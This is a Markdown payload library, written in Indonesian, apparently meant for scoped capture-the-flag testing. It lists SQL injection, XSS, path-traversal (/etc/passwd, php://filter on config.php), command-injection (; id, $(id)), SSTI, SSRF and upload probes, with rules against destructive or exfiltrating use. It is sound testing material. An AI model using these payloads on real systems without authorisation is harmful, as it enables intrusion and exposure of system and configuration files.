# Payload Library — Targeted CTF Validation

Gunakan hanya pada target yang ada di scope panitia. Library ini untuk satu request terarah dan validasi awal, bukan mass scanning. Setelah satu payload memberi indikator, hentikan probing dan verifikasi manual.

## Aturan penggunaan

```text
1. Pastikan endpoint dan parameter sudah diketahui.
2. Pilih satu payload dari kategori yang sesuai.
3. Kirim satu kali per target dengan delay antar-target.
4. Catat status, ukuran response, dan perubahan body.
5. Jangan gunakan payload destruktif.
```

## SQL Injection — boolean/error validation

### Numeric context

```text
1
0
1-0
1+0
1 OR 1=1
1 AND 1=1
1 AND 1=2
1) AND (1=1
1) AND (1=2
```

### String context

```text
'
''
" 
\"
' OR '1'='1
' AND '1'='1
' AND '1'='2
') OR ('1'='1
') AND ('1'='2
```

### Comment termination

```text
' OR '1'='1'-- 
' OR '1'='1'-- -
' OR '1'='1'#
' OR '1'='1'/*
admin'--
```

### UNION column-count checks

Gunakan hanya jika endpoint memang mengembalikan hasil query dan aturan lomba mengizinkannya:

```text
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

### Database-specific harmless version checks

```text
# MySQL/MariaDB
' AND (SELECT 1)=1-- -

# PostgreSQL
' AND (SELECT 1)=1-- -

# SQLite
' AND (SELECT 1)=1-- -

# SQL Server
' AND 1=1--
```

Jangan memakai `DROP`, `DELETE`, `UPDATE`, `INSERT`, `xp_cmdshell`, `LOAD_FILE`, atau payload yang membaca credential/berkas sensitif.

## XSS — reflection/context validation

### HTML body

```html
XSS_TEST_123
<b>XSS_TEST_123</b>
"><b>XSS_TEST_123</b>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Attribute context

```text
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
"><img src=x onerror=alert(1)>
```

### JavaScript string context

```text
');alert(1);//
\';alert(1);//
";alert(1);//
```

### DOM sink indicators

```text
XSS_DOM_TEST
<img src=x onerror=alert(document.domain)>
```

Gunakan browser/devtools untuk memastikan konteks. Reflection saja belum membuktikan eksekusi. Jangan memakai cookie exfiltration atau mengirim data keluar jaringan.

## LFI / path traversal — read-only checks

### Linux

```text
../../../../etc/passwd
../../../../../etc/hostname
..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
....//....//....//etc/passwd
```

### Windows

```text
..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts
..%5c..%5c..%5cWindows%5cSystem32%5cdrivers%5cetc%5chosts
```

### PHP source disclosure check

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=config.php
```

Gunakan hanya pada aplikasi lomba yang memang disiapkan untuk pengujian. Jangan membaca private key, credential production, atau file host panitia.

## Command injection — harmless identity checks

Gunakan hanya jika endpoint memang menjalankan command dan command tersebut diizinkan aturan lomba:

```text
; id
| id
&& id
|| id
$(id)
`id`
; whoami
| whoami
```

Windows:

```text
& whoami
| whoami
& echo CMD_TEST
```

Jangan gunakan `rm`, `shutdown`, `reboot`, `chmod -R`, reverse shell, downloader, atau command persistence.

## SSTI — arithmetic-only detection

### Jinja2 / Flask

```text
{{7*7}}
{{7+7}}
{{'A' * 3}}
```

### Twig

```text
{{7*7}}
{{7+7}}
```

### Freemarker

```text
${7*7}
${7+7}
```

### Java EL / generic expression indicators

```text
${7*7}
#{7*7}
```

Indikator vulnerability adalah perubahan response menjadi `49` atau hasil ekspresi lain. Jangan memakai payload subclass traversal atau eksekusi OS.

## SSRF — local marker checks

Gunakan hanya bila aplikasi memiliki fitur fetch URL dan target internal sudah disetujui:

```text
http://127.0.0.1/
http://localhost/
http://[::1]/
```

Jika panitia menyediakan endpoint marker khusus, gunakan marker tersebut. Jangan meminta metadata cloud, scanning port internal, atau mengakses jaringan di luar scope.

## File upload — validation probes

```text
normal-image.jpg
normal-image.png
file.txt
double-extension.jpg.txt
filename with spaces.jpg
../filename.jpg
```

Tujuan validasi adalah melihat apakah aplikasi memeriksa extension, MIME, nama file, dan lokasi penyimpanan. Jangan mengunggah webshell atau file executable.

## Authentication / access-control checks

```text
# Uji IDOR secara manual dengan dua object ID yang memang tersedia
/profile?id=OWN_OBJECT
/profile?id=OTHER_OBJECT

# Uji method handling dengan satu request per method
GET
POST
HEAD
```

Jangan melakukan password spraying, credential stuffing, atau brute force.

## Interpretasi hasil

| Indikator | Arti |
|---|---|
| Response berubah hanya pada kondisi true/false | Kandidat boolean-based injection |
| Error database muncul | Kandidat injection, perlu konfirmasi manual |
| Payload XSS dipantulkan | Kandidat reflection; cek encoding dan konteks |
| `49` dari SSTI arithmetic | Kandidat template evaluation |
| Isi file marker terbaca | Kandidat path traversal/LFI |
| Body berbeda tetapi status sama | Bandingkan diff body dan log aplikasi |
| Timeout | Jangan langsung ulangi; cek apakah endpoint memang lambat |
